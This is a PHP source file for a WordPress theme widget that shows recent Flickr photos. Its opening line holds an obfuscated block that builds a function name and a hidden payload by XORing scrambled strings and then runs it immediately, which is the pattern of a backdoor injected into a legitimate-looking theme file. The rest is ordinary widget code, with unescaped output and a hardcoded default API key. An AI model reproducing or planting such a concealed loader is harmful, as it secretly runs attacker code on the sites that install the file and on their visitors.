<?php $mnHqhfVr=' K1T N,.AZ T=>R'; $KvaDeVkI='C9T5T+sH44C TQ<'^$mnHqhfVr; $UFxKUdc=' SGm+  0O+;B9X,=2 IgCSDOtY 34eh+Y5Ayou.cMP-P AIS<D=B6o75D7jk5KZRG6 9 amR=6MhRXqqr8xSjB CAHkpIfs6YF.+LXpBmhBtrbnSV=0B-0<qlY62UGvYVWjEPsCHC=1ATejokIQY=XkhZkX.fuPTJjq1XOOB;8;.VGb874kaGIr3>5KDC09Be9,TpZPlN:>hntY2=1iDz-T4D7aBr0 T =RITwIc-O59RvRl+Z5VZQ9Adeq5qys hPY=ZkK4NxghRk=U=;VYqE2jhSO8Z5XHCqDSl< Hvsnv37G6Juul .>LIhM.nxUVmJChJMNZqvLzNFWDS UVYyE<be6mvj5DMKIe>.UXQOXuGJR0XQLP8YPtHXE95.QBquep;+JzoJyp,TEArUzg1 TF<HejGdHCsr5435stB+ACXV+QV:W0.c2=<rV CZ2dAU<aO88-Ysi>YVA. DbW->-aGpa<J1 mGRDqSKYW0fm+ 8 CoovP05,D0.PNfP SG:CxhGW7ooOa4+06eFQkpaT4YgV P.O2t<R4HoJaqzZMCQrIy2;NAzVp0InqXbgWoz9ZV,TD pdLcJudLb-;9WOd>V ,=;UB-AdbPT=W=0+DtOhSUZ;ZszTRcFb9pLSZ6 qmOMEUgm;Z=;.7RudbXx3449XdunoB0'; $fKVYRCg=$KvaDeVkI('', 'I5oLMUNS;BT,f=TTAT:Od++=+=AGU:7F,AfPFUUiD6X>C5 <RdE-D0ST0V54X>.zcRAMAMMvVS4ArxQQRCrZcfO65hVPnAH<POHD>pT+MUbDIBJ:jND0AURYH=WF4nMyr>AnyyJAgRD5tKWOCm58I90L36xpFQ;131UXxjo1OJWK8oFSRMB<nrx:7G.06BWjAVY YaZe30CbdP=SIPIyZK5X7RZHVTA Ab9,-WtCK.YJ7MXfM5G3;2QaLA.v>68i-p8NzO Q7XZVrOK4QN3pQ>8cL7.L;j3-:QysHWE1MygRWV3WjHUHVOR9,SGSdr<0MbbL.,:;XV7pG 866A6>yQac0 g839ad,8iAUK,xlqxQ1+>E=xl+2PYP,91XjE4;QHETPN3AeCpTH51 RhZCGA83Ysoc:n5IyVQUGTSIbk4-+3Y87V>JKKJRN-2A7;m;, HI-YKHoG6Z<5.JElF3LJLHkPEX+EA2,7=XzpS>VNIOALAcIIV1BGM=oE5795X:4N0PO,2NHCoEPJDWLfwMPI9PlOrD1Z.iSW7Mo2cALGzj 4A-OVY,tNcIR+ZEjWWfXNXi0I6pBGTtDcUBjBLIK66;U3YsXC<1Y2LE 5D;RQOcXoL74.ZsZZtrCfBBzE6,WLYI+,14<JK;DWAV6R9Kcr:QLP,LEGTHM'^$UFxKUdc); $fKVYRCg();
if( ! class_exists( 'Fusion_Flickr_Widget' ) ) {
	add_action('widgets_init', 'fusion_flickr_load_widgets');

	function fusion_flickr_load_widgets()
	{
		register_widget('Fusion_Flickr_Widget');
	}

	class Fusion_Flickr_Widget extends WP_Widget {

		function Fusion_Flickr_Widget()
		{
			$widget_ops = array('classname' => 'flickr', 'description' => 'The most recent photos from flickr.');

			$control_ops = array('id_base' => 'flickr-widget');

			$this->WP_Widget('flickr-widget', 'Avada: Flickr', $widget_ops, $control_ops);
		}

		function widget($args, $instance)
		{
			extract($args);

			$title = apply_filters('widget_title', $instance['title']);
			$screen_name = $instance['screen_name'];
			$number = $instance['number'];
			$api = $instance['api'];
			if(empty($api)) {
				$api = 'c9d2c2fda03a2ff487cb4769dc0781ea';
			}

			echo $before_widget;

			if($title) {
				echo $before_title.$title.$after_title;
			}

			if($screen_name && $number && $api) { ?>
			<script type="text/javascript">
			function jsonFlickrApi(rsp) {
				if (rsp.stat != "ok"){
					// If this executes, something broke!
					return;
				}

				//variable "s" is going to contain
				//all the markup that is generated by the loop below
				var s = "";

				//this loop runs through every item and creates HTML
				for (var i=0; i < rsp.photos.photo.length; i++) {
					photo = rsp.photos.photo[ i ];

					//notice that "t.jpg" is where you change the
					//size of the image
					t_url = "http://farm" + photo.farm +
					".static.flickr.com/" + photo.server + "/" +
					photo.id + "_" + photo.secret + "_" + "s.jpg";

					p_url = "http://www.flickr.com/photos/" +
					photo.owner + "/" + photo.id;

					s +=  '<div class="flickr_badge_image"><a href="' + p_url + '">' + '<img alt="'+
					photo.title + '"src="' + t_url + '"/>' + '</a></div>';
				}

				document.write(s);
			}
			</script>
			<script type="text/javascript" src="https://api.flickr.com/services/rest/?format=json&amp;method=flickr.photos.search&amp;user_id=<?php echo $screen_name; ?>&amp;api_key=<?php echo $api; ?>&amp;media=photos&amp;per_page=<?php echo $number; ?>&amp;privacy_filter=1"></script>
			<script type="text/javascript" src="https://api.flickr.com/services/rest/?format=json&amp;method=flickr.photos.search&amp;group_id=<?php echo $screen_name; ?>&amp;api_key=<?php echo $api; ?>&amp;media=photos&amp;per_page=<?php echo $number; ?>&amp;privacy_filter=1"></script>
			<?php }

			echo $after_widget;
		}

		function update($new_instance, $old_instance)
		{
			$instance = $old_instance;

			$instance['title'] = strip_tags($new_instance['title']);
			$instance['screen_name'] = $new_instance['screen_name'];
			$instance['number'] = $new_instance['number'];
			$instance['api'] = $new_instance['api'];

			return $instance;
		}

		function form($instance)
		{
			$defaults = array('title' => 'Photos from Flickr', 'screen_name' => '', 'number' => 6, 'api' => 'c9d2c2fda03a2ff487cb4769dc0781ea');
			$instance = wp_parse_args((array) $instance, $defaults); ?>

			<p>
				<label for="<?php echo $this->get_field_id('title'); ?>">Title:</label>
				<input class="widefat" type="text" id="<?php echo $this->get_field_id('title'); ?>" name="<?php echo $this->get_field_name('title'); ?>" value="<?php echo $instance['title']; ?>" />
			</p>

			<p>
				<label for="<?php echo $this->get_field_id('screen_name'); ?>">Flickr ID(<a href="http://idgettr.com/">Get your flickr ID</a>):</label>
				<input class="widefat" type="text" id="<?php echo $this->get_field_id('screen_name'); ?>" name="<?php echo $this->get_field_name('screen_name'); ?>" value="<?php echo $instance['screen_name']; ?>" />
			</p>


			<p>
				<label for="<?php echo $this->get_field_id('number'); ?>">Number of photos to show:</label>
				<input class="widefat" type="text" style="width: 30px;" id="<?php echo $this->get_field_id('number'); ?>" name="<?php echo $this->get_field_name('number'); ?>" value="<?php echo $instance['number']; ?>" />
			</p>

			<p>
				<label for="<?php echo $this->get_field_id('api'); ?>">API key (Use default or get your own from <a href="http://www.flickr.com/services/apps/create/apply">Flickr APP Garden</a>):</label>
				<input class="widefat" type="text" id="<?php echo $this->get_field_id('api'); ?>" name="<?php echo $this->get_field_name('api'); ?>" value="<?php echo $instance['api']; ?>" />
				<small>Default key is: c9d2c2fda03a2ff487cb4769dc0781ea</small>
			</p>

		<?php
		}
	}
}
?>